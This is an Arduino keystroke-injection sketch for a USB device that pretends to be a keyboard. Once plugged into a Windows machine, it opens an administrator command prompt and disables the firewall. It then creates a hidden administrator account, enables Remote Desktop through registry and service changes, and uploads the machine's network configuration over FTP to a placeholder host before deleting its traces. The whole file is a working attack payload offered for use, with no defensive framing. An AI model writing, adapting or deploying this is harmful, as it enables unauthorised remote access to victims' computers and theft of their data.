#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(2000);
  typeKey(KEY_ESC);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_ESC);
  Keyboard.releaseAll();

  delay(400);
  Keyboard.print(F("cmd"));

  delay(400);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(400);
  Keyboard.print(F("netsh firewall set opmode mode=disable"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("ALT y"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("net user /add <uname> <passwd>"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("net localgroup administrators <uname> /add"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"fDenyTSConnections\" /t REG_DWORD /d 0x0 /f"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("sc config TermService start= auto"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("net start Termservice"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("cd %USERPROFILE%"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("ipconfig /all > number.txt"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("ftp -i <ftpip>"));

  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("<ftpuname>"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("<ftppass>"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("PUT number.txt"));

  typeKey(KEY_RETURN);

  delay(2000);
  Keyboard.print(F("bye"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.print(F("del number.txt"));

  typeKey(KEY_RETURN);

  delay(400);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  Keyboard.print(F("c"));

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
